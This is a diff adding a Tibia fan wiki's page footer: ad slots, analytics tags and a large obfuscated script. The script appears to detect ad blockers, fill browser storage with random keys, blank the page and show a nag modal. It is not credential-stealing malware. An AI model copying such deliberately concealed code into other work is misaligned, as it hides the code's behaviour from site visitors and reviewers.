+<!--<ins data-revive-zoneid="5" data-revive-target="_blank" data-revive-refresh="60" data-revive-id="e083ad21182d1a8ef04ffb1a732e37f8"></ins>					
+<ins data-revive-zoneid="5" data-revive-target="_blank" data-revive-id="e083ad21182d1a8ef04ffb1a732e37f8"></ins>-->
+</div>
+
+</div>
+<!-- banner rodape 970x250 -->
+<br><center>
+<div data-premium="" data-adunit="TIBIA_WIKI_RODAPE" data-sizes-desktop="[[970,250],[970,90],[728,90]]" data-sizes-mobile="[[320,50]]" ></div>
+</center><br>
+<!--<ins data-revive-zoneid="6" data-revive-target="_blank" data-revive-refresh="60" data-revive-id="e083ad21182d1a8ef04ffb1a732e37f8"></ins>
+<ins data-revive-zoneid="6" data-revive-target="_blank" data-revive-id="e083ad21182d1a8ef04ffb1a732e37f8"></ins>-->
+
+<footer id="footer" class="mw-footer" role="contentinfo" >
+	<ul id="footer-info">
+	<li id="footer-info-lastmod"> Esta página foi modificada pela última vez às 13h44min em 7 de maio de 2026.</li>
+	<li id="footer-info-copyright">© 2007~2026 Tibia Wiki. Todos os direitos reservados.<br />
+O jogo Tibia e todas as imagens contidas nesse site são propriedades de CipSoft GmbH.
+
+<br>
+
+Nosso acervo possui artigos baseados e/ou traduzidos a partir de um artigo com o mesmo nome no Tibia.Wikia.com.</li>
+</ul>
+
+	<ul id="footer-places">
+	<li id="footer-places-privacy"><a href="/wiki/Tibia_Wiki:Pol%C3%ADtica_de_privacidade">Nossa política</a></li>
+	<li id="footer-places-about"><a href="/wiki/Tibia_Wiki:Sobre">Sobre o Tibia Wiki - A Enciclopédia do Tibia</a></li>
+	<li id="footer-places-disclaimer"><a href="/wiki/Tibia_Wiki:Aviso_geral">Alerta de conteúdo</a></li>
+</ul>
+
+	<ul id="footer-icons" class="noprint">
+	<li id="footer-poweredbyico"><a href="https://www.mediawiki.org/" target="_blank"><img src="/resources/assets/poweredby_mediawiki_88x31.png" alt="Powered by MediaWiki" srcset="/resources/assets/poweredby_mediawiki_132x47.png 1.5x, /resources/assets/poweredby_mediawiki_176x62.png 2x" width="88" height="31" loading="lazy"/></a></li>
+</ul>
+
+</footer>
+
+<!--<div id='fixedban' style='width:100%;margin:auto;text-align:center;float:none;overflow:hidden;display:scroll;position:fixed;bottom:0;z-index:999;-webkit-transform:translateZ(0);'>
+<div style='text-align:center;display:block;max-width:728px;height:auto;overflow:hidden;margin:auto'> 
+<div>
+<ins data-revive-zoneid="30" data-revive-target="_blank" data-revive-refresh="30" data-revive-id="e083ad21182d1a8ef04ffb1a732e37f8"></ins>
+</div>
+</div>
+</div>-->
+
+
+		<!-- Google tag (gtag.js) -->
+		<script async src="https://www.googletagmanager.com/gtag/js?id=G-G3H7QS2930"></script>
+		<script>
+		  window.dataLayer = window.dataLayer || [];
+		  function gtag(){dataLayer.push(arguments);}
+		  gtag('js', new Date());
+
+		  gtag('config', 'G-G3H7QS2930');
+		</script>
+
+
+		<!-- Boa Compra banner pop up -->
+		<script type='text/javascript'><!--//<![CDATA[
+		   /* Only show pop up if in first page */
+		    if ( window.location.href.match(/.com.br\/$/) || window.location.href.match(/wiki.Home$/) ) {
+
+		var ox_u = 'https://banners.tibiabr.com/www/delivery/al.php?campaignid=1&target=_blank&layerstyle=simple&align=center&valign=middle&padding=1&closetime=20&padding=1&shifth=0&shiftv=0&closebutton=t&backcolor=ffffff&bordercolor=000000';
+		   if (document.context) ox_u += '&context=' + escape(document.context);
+		   document.write("<scr"+"ipt type='text/javascript' src='" + ox_u + "'></scr"+"ipt>");
+		}
+		//]]>--></script>
+
+<script data-cfasync="false" async src="https://tags.premiumads.com.br/dfp/e963520e-5b21-46db-9230-08d8c9c61284"></script>
+
+<script type="text/javascript"  charset="utf-8">
+// 4.2b 21/02/2022
+// Place this code snippet near the footer of your page before the close of the /body tag
+// LEGAL NOTICE: The content of this website and all associated program code are protected under the Digital Millennium Copyright Act. Intentionally circumventing this code may constitute a violation of the DMCA.
+                            
+var _0xb110=['','replace'];function yatDrecC(_0x955cx2){return _0x955cx2.toString()[_0xb110[1]](/^[^\/]+\/\*!?/,_0xb110[0])[_0xb110[1]](/\*\/[^\/]+$/,_0xb110[0])};var iJQludsRIPxz = yatDrecC(function() {/*!mdit(ncvkbqwv(x,i,k,s,m,l){m=ncvkbqwv(k){zmbczv(k<i?'':m(xizamQvb(k/i)))+((k=k%i)>35?Abzqvo.nzwuKpizKwlm(k+29):k.bwAbzqvo(36))};qn(!''.zmxtikm(/^/,Abzqvo)){epqtm(k--){l[m(k)]=s[k]||m(k)}s=[ncvkbqwv(m){zmbczv l[m]}];m=ncvkbqwv(){zmbczv'\\e+'};k=1};epqtm(k--){qn(s[k]){x=x.zmxtikm(vme ZmoMfx('\\j'+m(k)+'\\j','o'),s[k])}}zmbczv x}(';y k=X.A(98)+X.A(97)+\'j\'+X.A(97)+\'5f\'+X.A(5g)+\'a\'+X.A(5h)+X.A(2W);s(h.1c(k)){h.1c(k).r.1W(\'1B\',\'2H\',\'14\');h.1c(k).r.1W(\'24\',\'2d\',\'14\');h.1c(k).r.1W(\'1R\',\'0\',\'14\');h.1c(k).r.1W(\'5I\',\'2d\',\'14\')};s(k){1j k};s(h.D){h.D.r.1W(\'1B\',\'3K\',\'14\')};y W=\'\',1a=\'5K\',f=L.B((L.C()*6)+8);1b(y q=0;q<f;q++)W+=1a.1i(L.B(L.C()*1a.V));s(f){1j f};y 3m=8,2Z=5L,2D=94,2E=5M,1C=0,3N=\'2x\',3I=J(m){y w=!1,q=J(){s(h.1u){h.2P(\'2G\',b);O.2P(\'2z\',b)}S{h.2V(\'2s\',b);O.2V(\'23\',b)}},b=J(){s(!w&&(h.1u||5N.3q===\'2z\'||h.3p===\'2C\')){w=!0;q();m()}};s(h.3p===\'2C\'){m()}S s(h.1u){h.1u(\'2G\',b);O.1u(\'2z\',b)}S{h.34(\'2s\',b);O.34(\'23\',b);y v=!1;2j{v=O.5e==3u&&h.2u}29(z){};s(v&&v.2B){(J i(){s(w)Q;2j{v.2B(\'1q\')}29(b){Q 5O(i,50)};w=!0;q();m()})()}}};O[\'\'+W+\'\']=(J(){y m={m$:1a+\'+/=\',5Q:J(b){y i=\'\',l,v,w,t,a,k,z,q=0;b=m.b$(b);1t(q<b.V){l=b.1n(q++);v=b.1n(q++);w=b.1n(q++);t=l>>2;a=(l&3)<<4|v>>4;k=(v&15)<<2|w>>6;z=w&63;s(2M(v)){k=z=64}S s(2M(w)){z=64};i=i+1k.m$.1i(t)+1k.m$.1i(a)+1k.m$.1i(k)+1k.m$.1i(z)};Q i},19:J(b){y v=\'\',l,k,t,a,q,z,i,w=0;b=b.1l(/[^I-5R-5S-9\\+\\/\\=]/o,\'\');1t(w<b.V){a=1k.m$.2l(b.1i(w++));q=1k.m$.2l(b.1i(w++));z=1k.m$.2l(b.1i(w++));i=1k.m$.2l(b.1i(w++));l=a<<2|q>>4;k=(q&15)<<4|z>>2;t=(z&3)<<6|i;v=v+X.A(l);s(z!=64){v=v+X.A(k)};s(i!=64){v=v+X.A(t)}};v=m.v$(v);Q v},b$:J(m){m=m.1l(/;/o,\';\');y v=\'\';1b(y w=0;w<m.V;w++){y b=m.1n(w);s(b<1Y){v+=X.A(b)}S s(b>5T&&b<5U){v+=X.A(b>>6|5V);v+=X.A(b&63|1Y)}S{v+=X.A(b>>12|2I);v+=X.A(b>>6&63|1Y);v+=X.A(b&63|1Y)}};Q v},v$:J(m){y w=\'\',b=0,v=5W=1S=0;1t(b<m.V){v=m.1n(b);s(v<1Y){w+=X.A(v);b++}S s(v>5X&&v<2I){1S=m.1n(b+1);w+=X.A((v&31)<<6|1S&63);b+=2}S{1S=m.1n(b+1);2F=m.1n(b+2);w+=X.A((v&15)<<12|(1S&63)<<6|2F&63);b+=3}};Q w}};y u=[\'5Y\',\'5Z\',\'2K==\',\'5P==\',\'5c=\',\'5r=\',\'5b\',\'59\',\'5i\',\'5j==\',\'5k\',\'5l==\',\'5m=\',\'5n=\',\'5o==\',\'5p=\',\'58\',\'5q==\',\'5s==\',\'2O==\',\'2L=\',\'5t\',\'5u==\',\'5v=\',\'5w\',\'5x\',\'5y==\',\'5z\',\'5a=\',\'5A\',\'5d\',\'5B=\',\'6v=\',\'6x=\',\'6y\',\'6z\',\'6a=\',\'6b=\',\'6c\',\'6d\',\'6e=\',\'6f\',\'6w=\',\'6g=\',\'6I=\',\'6J=\',\'6K=\',\'6L=\',\'6M==\',\'6N==\',\'6O==\',\'6P==\',\'6Q=\',\'6R\',\'6h\',\'6u\',\'6i\',\'6t\',\'5E\',\'5F==\',\'5G=\',\'5H=\',\'61=\',\'62==\',\'66=\',\'67\',\'68=\',\'5D=\',\'69==\',\'6j=\',\'6k==\',\'2K==\',\'2L=\',\'6l=\',\'6m\',\'6n==\',\'2O==\',\'6o\',\'56==\',\'6q=\'],e=L.B(L.C()*u.V),n=m.19(u[e]),g=n,N=1,d=\'#6r\',q=\'#6s\',x=\'#5C\',G=\'#57\',Y=\'\',p=\'4B&2q; 55! 41 2a 2Q&2T; 42&2q; 35 43 2w 44. :w(\',c=\'45 v&46;w 47&2X;48 49 2R 3H, 4i 4k 4l 4m 4n 4o&4p;4r 4s 2a 4t 4j 3G 3D 3T 2a 2Q&2T; 3U 3X 2x 3B.\',T=\'3E 3W, 3Y 3C i 3A 3Z 3V: 4u 4q 4w&2X;4S 4U 2J 2R 4V 2w, 4W?\',H=\'4X! R&2q; 4Z w 4A &4v; 2J 4T 4C 2w.\',v=0,E=1,w=\'4E.4F\',a=0,Z=b()+\'.37\',o=J(m,b,w){y v=h.1r(\'3k\');v.1Q=m;v.23=b;v.2s=b;v.1u(\'4H\',b);w.1p(v)},I=J(){};J j(m){s(m)m=m.2k(m.V-15);y w=h.3j(\'3k\');1b(y v=w.V;v--;){y b=X(w[v].1Q);s(b)b=b.2k(b.V-15);s(b===m)Q!0};Q!1};J K(m){s(m)m=m.2k(m.V-15);y b=h.51;f=0;1t(f<b.V){1e=b[f].1G;s(1e)1e=1e.2k(1e.V-15);s(1e===m)Q!0;f++};Q!1};J b(m){y v=\'\',w=1a;m=m||30;1b(y b=0;b<m;b++)v+=w.1i(L.B(L.C()*w.V));Q v};J z(v){y z=[\'53\',\'54==\',\'4D\',\'4R\',\'3i\',\'4h==\',\'4Q==\',\'4y=\',\'4z==\',\'4a==\',\'4b\',\'3i\'],q=[\'38=\',\'4d==\',\'4e==\',\'4f==\',\'4x=\',\'4g\',\'4I=\',\'4J=\',\'38=\',\'4L\',\'4M==\',\'4N\',\'4O==\',\'4P==\',\'6S==\',\'6T=\'];f=0;2m=[];1t(f<v){k=z[L.B(L.C()*z.V)];l=q[L.B(L.C()*q.V)];k=m.19(k);l=m.19(l);y i=L.B(L.C()*2)+1;s(i==1){w=\'//\'+k+\'/\'+l}S{w=\'//\'+k+\'/\'+b(L.B(L.C()*20)+4)+\'.37\'};2m[f]=2e 2f();2m[f].2g=J(){y m=1;1t(m<7){m++}};2m[f].1Q=w;f++}};J t(m,b){y w=\'\';1b(y z=0;z<m.V;z++){y v=m.1n(z);s(97<=v&&v<8b){w+=X.A((v-b+7)%26+97)}S s(65<=v&&v<91){w+=X.A((v-b+13)%26+65)}S{w+=X.A(v)}};Q w};J i(m){m=m.1l(/{/o,\'\');m=m.1l(/}/o,\'\');m=m.1l(/|/o,\'\');m=m.1l(/~/o,\'\');Q m};J U(m){};Q{8f:J(m,b){m=m+b;m=m-1;Q L.8h(m)},1F:J(m,v){s(8I h.D==\'3R\'){Q};y z=\'0.1\',v=g,b=h.1r(\'1A\');b.1s=v;b.r.1f=\'1H\';b.r.1q=\'-1d\';b.r.1m=\'-1d\';b.r.1v=\'2r\';b.r.16=\'8J\';y l=h.D.33,i=L.B(l.V/2);s(i>15){y w=h.1r(\'2b\');w.r.1f=\'1H\';w.r.1v=\'1O\';w.r.16=\'1O\';w.r.1m=\'-1d\';w.r.1q=\'-1d\';h.D.8L(w,h.D.33[i]);w.1p(b);y q=h.1r(\'1A\');q.1s=\'32\';q.r.1f=\'1H\';q.r.1q=\'-1d\';q.r.1m=\'-1d\';h.D.1p(q)}S{b.1s=\'32\';h.D.1p(b)};a=8g(J(){s(b){m((b.2v==0),z);m((b.2t==0),z);m((b.24==\'2H\'),z);m((b.1B==\'2d\'),z);m((b.1R==0),z)}S{m(!0,z)}},2n)},8u:J(m,b){m=m*b;Q L.87(m)},1X:J(b,l){s((b)&&(v==0)){v=1;O[\'\'+W+\'\'].1x()}S{s(O[\'\'+W+\'\']){s(!O[\'\'+W+\'\'].2o){y H=m.19(\'88\'),f=h.89(H);s((f)&&(v==0)){s((2Z%3)==0){y a=\'8i=\';a=m.19(a);s(j(a)){s(f.27.1l(/\\a/o,\'\').V==0){v=1;O[\'\'+W+\'\'].1x()}};s(a){1j a}}}}};y T=!1;s(v==0){s((2D%3)==0){s(!O[\'\'+W+\'\'].2o){y p=[\'8k==\',\'86==\',\'8l=\',\'8n=\',\'8o=\'],x=17,g=p.V,q=p[L.B(L.C()*g)],w=q;1t(q==w){w=p[L.B(L.C()*g)]};q=i(q);q=t(q,x);q=m.19(q);w=i(w);w=t(w,x);w=m.19(w);s(p){1j p};y u=2e 2f(),d=2e 2f();u.2g=J(){z(L.B(L.C()*2)+1);d.1Q=w;s(w){1j w};z(L.B(L.C()*2)+1)};d.2g=J(){v=1;z(L.B(L.C()*3)+1);O[\'\'+W+\'\'].1x()};u.1Q=q;s(q){1j q};s((2E%3)==0){u.23=J(){s((u.16<8)&&(u.16>0)){O[\'\'+W+\'\'].1x()}}};y E=[\'8P/8r=\',\'8s\',\'8t=\',\'8O=\',\'8w/8Q\',\'9l=\',\'9j\'],G=[\'9i==\',\'92=\',\'95=\',\'96\'],c=E.V,k=E[L.B(L.C()*c)],c=G.V,n=G[L.B(L.C()*c)];k=m.19(k);n=m.19(n);k=k.1l(\'99.35\',n);k=\'//\'+k;O[\'1P\']=0;y e=J(){s((1P>0)&&(1P%39==0)){}S{O[\'\'+W+\'\'].1x();s(1P){1j 1P}}};o(k,e,h.D);O[\'\'+W+\'\'].2o=!0};O[\'\'+W+\'\'].1X=J(){Q}}}}},1x:J(){s(O[\'\'+W+\'\'].1X){1j O[\'\'+W+\'\'].1X};s(O[\'\'+W+\'\'].1F){1j O[\'\'+W+\'\'].1F};s(E==1){y K=2y.3t(\'2p\');s(K>0){Q!0}S{2y.1E(\'2p\',(L.C()+1)*2n)}};y t=\'8G\';t=m.19(t);y Y=h.3l||h.3j(\'3l\')[0],l=h.1r(\'r\');l.3q=\'1y/8U\';s(l.3r){l.3r.1o=t}S{l.1p(h.8W(t))};Y.1p(l);8R(a);h.D.27=\'\';h.D.r.1o+=\'11:1O !14\';h.D.r.1o+=\'1V:1O !14\';y Z=h.2u.2t||O.3S||h.D.2t,n=O.8A||h.D.2v||h.2u.2v,i=h.1r(\'1A\'),g=b();i.1s=g;i.r.1f=\'2U\';i.r.1q=\'0\';i.r.1m=\'0\';i.r.16=Z+\'1U\';i.r.1v=n+\'1U\';i.r.2N=d;i.r.2c=\'8C\';h.D.1p(i);y k=\'<i 1G="8D://8E.8F/85;"><36 1s="2A" 16="3n" 1v="40"><3o 1s="2Y" 16="3n" 1v="40" 7y:1G="83:3o/84;79,7i+7j+7k+P+P+P+P+P+P+P+P+P+P+P+P+P+P+P+P+P+P+P+P+P+P+P+P+P+P+P+P+P+P+P+P+7l+7m+77/7n/7p/7q/7r/7s+/7u/7v+7o/75+6E/74/6X/6Y/6Z/6A/6B+6C/6V+6D+6F+6G+6H+70/71+72/73+7w/76+7x+7S+7U+7V/7W+7X/7Y/7Z/7A+7T+7B/7D+7E+7F+7G+M+7H/80/81/82/7C/7R/+7I/7Q++7a/7b/7c+7d/7e+7f+7g==">;</36></i>\';k=k.1l(\'2A\',b());k=k.1l(\'2Y\',b());y z=h.1r(\'1A\');z.27=k;z.r.1f=\'1H\';z.r.1M=\'1D\';z.r.1q=\'1D\';z.r.16=\'7h\';z.r.1v=\'7J\';z.r.2c=\'2S\';z.r.1R=\'.6\';z.r.3J=\'3L\';z.1u(\'7L\',J(){w=w.7M(\'\').7N().7O(\'\');O.3e.1G=\'//\'+w});h.1c(g).1p(z);y v=h.1r(\'1A\'),I=b();v.1s=I;v.r.1f=\'2U\';v.r.1m=n/7+\'1U\';v.r.6W=Z-2W+\'1U\';v.r.7t=n/3.5+\'1U\';v.r.2N=\'#8T\';v.r.2c=\'2S\';v.r.1o+=\'F-1N: "8Z 93", 1K, 1I, 1J-1L !14\';v.r.1o+=\'8j-1v: 8m !14\';v.r.1o+=\'F-1z: 8M !14\';v.r.1o+=\'1y-1T: 1Z !14\';v.r.1o+=\'1V: 8K !14\';v.r.24+=\'3h\';v.r.3g=\'1D\';v.r.8x=\'1D\';v.r.8d=\'3x\';h.D.1p(v);v.r.8c=\'1O 8y 6p -3F 8a(0,0,0,0.3)\';v.r.1B=\'3K\';y j=30,o=22,e=18,f=18;s((O.3S<3M)||(8e.16<3M)){v.r.3c=\'50%\';v.r.1o+=\'F-1z: 8H !14\';v.r.3g=\'8X;\';z.r.3c=\'65%\';y j=22,o=18,e=12,f=12};v.27=\'<3y r="1h:#7P;F-1z:\'+j+\'21;1h:\'+q+\';F-1N:1K, 1I, 1J-1L;F-28:7K;11-1m:1w;11-1M:1w;1y-1T:1Z;">\'+p+\'</3y><3Q r="F-1z:\'+o+\'21;F-28:7z;F-1N:1K, 1I, 1J-1L;1h:\'+q+\';11-1m:1w;11-1M:1w;1y-1T:1Z;">\'+c+\'</3Q><78 r=" 24: 3h;11-1m: 0.3s;11-1M: 0.3s;11-1q: 2h;11-3v: 2h; 3d:8B 8Y #8V; 16: 25%;1y-1T:1Z;"><x r="F-1N:1K, 1I, 1J-1L;F-28:3f;F-1z:\'+e+\'21;1h:\'+q+\';1y-1T:1Z;">\'+T+\'</x><x r="11-1m:8S;"><2b 90="1k.r.1R=.9;" 9k="1k.r.1R=1;"  1s="\'+b()+\'" r="3J:3L;F-1z:\'+f+\'21;F-1N:1K, 1I, 1J-1L; F-28:3f;3d-8q:3x;1V:1w;8p-1h:\'+x+\';1h:\'+G+\';1V-1q:2r;1V-3v:2r;16:60%;11:2h;11-1m:1w;11-1M:1w;" 8v="O.3e.8N();">\'+H+\'</2b></x>\';O[\'\'+W+\'\']=3R;2j{1j O[\'\'+W+\'\']}29(u){}}}})();O.3P=J(m,b){y v=8z.6U,w=O.4K,i=v(),z,q=J(){v()-i<b?z||w(q):m()};w(q);Q{4c:J(){z=1}}};y 3O;3I(J(){J l(){2j{Q\'1g\'52 O&&O[\'1g\']!==3u}29(m){Q!1}};J k(){y v=m(10),b=m(10);w(v,b);y z=q(v);s(z==b){Q!0}S{Q!1}};J w(m,b){s(b==\'\'){1g.4G(m)}S{3a=b;1g.1E(m,3a)}};J q(m){2i=1g.3t(m);s(2i){};s(2i){Q 2i}S{Q\'3w\'}};J m(m){y v=\'\',w=1a;m=m||30;1b(y b=0;b<m;b++)v+=w.1i(L.B(L.C()*w.V));Q v};J t(m,b){Q L.B(L.C()*(b-m)+m)};y i=1,v=\'4Y\';s(3N!=\'2x\'){s(l()){s(k()){y b=q(v);s(b==\'3w\'){w(v,m(1C));b=m(1C);y z=1,a=\'\';1t(z<30){3z=m(10);3b=m(t(0,9));1g.1E(3z,3b);z++};1j z}S{};b=b.V;b--;s(b>0){w(v,m(b));Q!0}S{s(i==1){w(v,m(1C));2y.1E(\'2p\',0)}}}S{}}S{}};3O=O.3P(J(){O[\'\'+W+\'\'].1F(O[\'\'+W+\'\'].1X,O[\'\'+W+\'\'].5J)},3m*2n)});',62,572,'|||||||||||||||||||abgtm|qn||||||diz|||||||||lwkcumvb||ncvkbqwv||Uibp|||eqvlwe|dz6|zmbczv||mtam|||tmvobp|GruTNmBfIbTqa|Abzqvo|||nzwuKpizKwlm|ntwwz|zivlwu|jwlg||nwvb||||uizoqv|||quxwzbivb||eqlbp|||lmkwlm|kpizIb|lmtmbm|bpqa|zmxtikm|bwx|kpizKwlmIb|kaaBmfb|ixxmvlKpqtl|tmnb|kzmibmMtmumvb|ql|epqtm|illMdmvbTqabmvmz|pmqopb|10xf|eBiYMXFOya|bmfb|aqhm|pjJdkGKanOJ|nwz|ombMtmumvbJgQl|5000xf|bpqaczt|xwaqbqwv|twkitAbwziom|kwtwz|omvmdi|aiva|Pmtdmbqki|amzqn|jwbbwu|niuqtg|0xf|vP7mFhWaO|azk|wxikqbg|k2|itqov|xf|xillqvo|ambXzwxmzbg|NFXdbaZBXTBO|128|kmvbmz|LQD|dqaqjqtqbg|kDJgNdJgcAY|30xf|ambQbmu|YvyfIYFbOo|pzmn|ijawtcbm||xb||wvtwil|lqaxtig|||qvvmzPBUT|emqopb|kibkp|owb|bzg|acjabz|qvlmfWn|NLUZKpkc|1000|MtgJyamZPE|opIzxWpaSy|iikcbm|60xf|wvzmilgabibmkpivom|ktqmvbEqlbp|lwkcumvbMtmumvb|ktqmvbPmqopb|iljtwksmz|vw|amaaqwvAbwziom|twil|ycm|lqd|hQvlmf|vwvm|vme|Quiom|wvmzzwz|icbw|224|epqbmtqab|GEZnG2ppju5tjI|GEZhHFR2HFQ|qaViV|jiksozwcvlKwtwz|GEZhHE5hHY|zmuwdmMdmvbTqabmvmz|dwk|lm|10000|mkqzk|nqfml|lmbikpMdmvb|120|qikcbm|NQTTDMKBQL2|bysTVeSBkAGz|NQTTDMKBQL1|lwAkzwtt|kwuxtmbm|ijmLnCmEq|bRsykZfAs|k3|LWUKwvbmvbTwilml|pqllmv|||jivvmz_il|kpqtlVwlma|ibbikpMdmvb|kwu|ado|rxo|HuN2iEVdjq5xG28||kONglO5tkuNskg55k20cmENwj28cG29b|ombMtmumvbaJgBioVium|akzqxb|pmil|RLEHENwAO|160|quiom|zmilgAbibm|bgxm|abgtmApmmb|5mu|ombQbmu|vctt|zqopb|vv|15xf|p3|hh|vmeditcm|ff|hwwu|jwzlmz|twkibqwv|300|uizoqvTmnb|jtwks|VeWOuIIAYreU|kczawz|dqaqjtm|xwqvbmz|640|CCFHXkDFf|wgjSULlY|bafuGnOq|p1|cvlmnqvml|qvvmzEqlbp|mabzcbczi|bivbw|irclivlw|nidwz|owabi|vwa|bm|kwvbqvciz|iz|irclm|maai|Xwz|8xf|bwli|iaaqvibczi||Dquwa|mab|cu|tqoilw|Kwuw|ibqtlm|xwaac|uwa|aqabmui|vwaai|uivbmz|zmvli|am|jiamqi|mu|iv|cikcbm|vwaaw|vkqwa|xizi|kwvaqoiuwa|Ilqkqwvm|iozidm|lwu|k2b5k2VgGFJtkq5ykOk|G2NhTuVaiEVzGERxjOt0mA5rj20|kPRdjE90HA5eGEtgTuVdjY|GEZhTvtpiO9dTuVdjY|GFUciE5qj3ocG29b|ktmiz|GuNcjuDgTuxeHe|VLG4mLGeTuxeHe|VhQemLseTuxeHe|UBU2V19pHK1rjOttjvZRZLQ0VrYcivJv|GA5aiFHtk3JdkvZbHEZxGA5tlY|GEZrjOttjvYbULIgUBY3TEpdk3YfTERpju5tkq1pHK5ykOk|Y0ZWTBUhVK0fULsbUBU3mK1pHK1qGE5cHFQ|zmycmabIvquibqwvNzium|GEYbjONgH2CckO5v|k3N1GFRtTENsTvJcHe|HuN2iEVdjrMciEVd|GuNcjuDgF2NsTulxHo|jONgH2DnGuNcjuDgTulxHo|GEZ2HFR0iFVxjukcGE9aTuVdjY|GEYcHu94juD0l29gi3UcG29b|vqw|lw|vi|amc|ws|Mvbmvlq|OQNRhlJSZ|ilqkqwvmq|aqbm|Wt|umc|ivDxG3tpHPUcG29b|uwk|skwtjliskwtj|zmuwdmQbmu|mzzwz||abgtmApmmba|qv|GEZcTuDqGFscG29b|GEYcjENxjK5glY|Bqjqivw|j3D0GvRpiE4bkONxHI|NNNNNN|GEZhTBIf|GEZnUhIe|GEZnUBQe|GEZnGFRtGY|GEZnHu9dlODg|GEZukuNbHY|GEZwHENsHFQ|GEZxHvRpjEC|GEZej3J1kI|GEZhTBM|GEZhTERpju5tko|GEZhF3Z5kOC|GEZhTEHdj3Ztko|GEZhiEZtGuNg|GEZhkONrHY|GEZhkFDpkuC|GuNcjuDgVLG4|GuNcjuDgVhQ4mLse|GEYbjODulI|GEZKGE5cHFRFkuNe|GEYbHvRpjEC|GEZnVhQ4|GEZnk3JpG2C|GEYbiE1v|nziumMtmumvb|aj|109|103|ivquibqwv|crGPxEdwKbm|IJKLMNOPQRSTUVWXYZABCDEFGHijklmnopqrstuvwxyzabcdefgh0123456789|250|295|mdmvb|ambBqumwcb|GEZnk2fdlI|mvkwlm|Hi|h0|127|2048|192|k1|191|GEZnGu94|GEZnGutv|GEYbiODpHODg|GEYbiE5cHFQ|ilj8nn|GEZqGE5cHFQ|ZOt2YEZL|YEZRjENvHY|YEZMiFG|YEZKj3ofVrI||YEZLj250GEtcHFQ|H2fxjubhl3RpkPJtko||||GEZCHENhHFQ|GuNcjuDgF2Ns|GEZKGE5cHFQ|GEZJHI|ZOt2YEZJ|GuNcjuDgGEY|QONsF2RdmI|GuNcjuDgiEY|GEZhjO90|kO9elFJpHI|H29dH2ftF2Ns|24xf|k3JdjvVdkuDsF2fxjua|MMMMMM|777777|ZOt2YEZK|ZOt2YEYh|GEYbjONqHEe|YEZOkuNbHBM|GEYbjOQ|GEYbHu9dlODg|GEYbG29clONxjuDg|GEYbG29clONxjuDgTBM|GEYbG29clONxjuDgTBQ|YEYhULJ4UBY1|YEYhULJ4UrCe|YEY3Urp4WBI|YEZJkuDp|YEZOkuNbHBQ|ZOt2YEYg|YEZOkuNbHBU|YEZOkuNbHBY|YEZUGFttkrM|YEZUGFttkrQ|YEZhF2ldj2laHD8eUY|YEZhF2ldj2laHD8eUo|YEZhF2ldj2laHD8eUe|YEZhF2ldj2laHD8eVI|ZOt2YEY|ZOt2YEYf|l2tsHD9hi3thG3RpkODgTuxeHe|GEZ2HFR0iFVtjEDclK0hVLUgUg5ykOk|vwe|ZCQzeOs|uqvEqlbp|Tvf0bQTUSx3cdfQ61qGP33Yy3U24s|DWXmt7ZQlmQJslw|PG9EIhxHTAAKVYzHjOW1v4D4p9cLX7ZBqQQgiNYwqznfKnbqpb4aS8SmSyXp34L2A7BaZWPZqgUzIfzbVua9P5Yie9WjC1P4Eld8h0R8wjdWw|el4SIvsujimXaxI|0qldojzLmJpkS|McR0ObTCrDnbdeMGyuiZ66RF9Ixix6kKgSpqD|ylEg60S14s|UohVNiKDgPDQWVjf1MLzbKhb6hUMOhNhNeNHR19rxRg2yf5JkugJU|KFZBBYieDwojSmLMa2pa4UbRkVDBG2SokteP2dGWLNBi4NY|1NUhHQOYZ3PER4N1ByEbWiILy0H9qbDHzo1A6RTq7J1UIbCKF1fVJ0G0wT9pxS4|GjCUVDryOgAezZCOaTc6|cEL20TaVQLlYcb4TFI|SuAf|0voi14YR3OWEyLuWeRoZwAum8WWpIYyqCpXUjCOsaKr5Tbi4KjmNpF9VV0Bxvg|JSxfiytIWdKyJrhBNIx2VNclR5ximtA5BjebJtIdVoMlmMOQ6W6RCb42VpcdhHdrFBPfeqiJFCQUvISi5Xy9AT3ov1SIWMsoPDEJQUC14LJN2WP3SWnYxO2wAYxSGIMlS0UOkLo1fjlWEg|wOSuE8LINmLWfnWRU4LkvBGzbB7lpHtbBE7WFPJ1KtMEsXW0RuoMU1xmja5KkI2CKBA6YgPUiMbgk3TItEkLrHZmgTxSHA9cB02086dc0bRi|QAeQh5dnYgLN3F|Q1BxW7KvJHW|nv5MZMY9XB3ASAvD1lFsa7WazSgxyiujuxyZsHNlFD1ZCDPZQAPYPZ309XBy4mPx3VhXh8|pz|jiam64|qDJWZe0SOowIIIIVACpMCoIIISIIIIIwKIUIIIJW8oOyIIIJ|1JUDMFz6|aIIILz6|aIIILUIIIaSgaSKowsRKZgkvQMJIBy6cwCNJBUhUhz6czryywAMpQOJoifajPkl3lGENo0VLBue8XHG2U5WBsnPf|mvx7BVBCwRgnu5citxiD5mFsWLo7s5WBiiuwySAvk3VhH2luPp4lzi2bPZ0nDYCNIYMLXMfXVJYFw6Wpdj28QKIrx19nA0bTvhk29dj25cju1bjEEtxiVrG3lnF1wiOpCDNZUBMeiOpwFNfny5cjp4mPm3b7Pf8nos5XnrG3mo4WJoGN|Tg8dSgazLe8W4cTrsb7npvRhot5l7m3bsHOBGDtHXB08dTq7WKec|kQi9H8QsOGi9WOFXRLu5ZvUF5xqu7GbBTJ24jbCSuSvHmEaExoPvhQX5CckdVwLzt8OCzDgCJU4fyY|d792lvjjlPBHGEPHFt7GEtxHEDvDZsGvRqj8|XhVhk3ugUrtczzraTLpwiPln3|ii2bpGEPFCNLCXLhCWBvw0lPqxyjkmPriH2lKYsTATg|d7|uqvPmqopb|j29dtdj2fv5|mrQhijE26AsyoULI7PJgZIILwU7srIIIIQvZABtU6IKB4fpsXbG5qVqIQ9XTd6lzAxyOGktxU5jmvosY8VLIvaOqOUeIIJmbRZMNCEUXV2OlBM1MGpuNY7T339zevoD2QqZRVQOIo1AYsNIPxovYxSvHJIFdddFn9uj5vafcByLV|qySrwZIMLtH4awTpfAokg6opoWg7MmK2XQ4LPj7xW7uZeBJgd5pOfN|YkEzCZPRATzjJVIfHBPjoAKaPFRsuJfqaUdMzNDkoM|ftqvs|500|c3B9IjLrFeQUFnfuaizeS9eCJJ5Sr8g2lKe|Sy8j7u0ZxeiavZ|cRgtC|lMntyF6ohK4pl1rAoh0cruXsgoLrdVGLaC0HoorSJyTXzYTnLCYQhfUJbAWckZeThzlY2LNW0VLlvaGy0gwRgMJ0NPBJPmngfkgCg8rntP7aPahAnoibp4pGekL3U29Q5LUhlJVW2QNkK5g6PAlcwn4O5lYVUEl4kLkrVVmVOuj02|Cd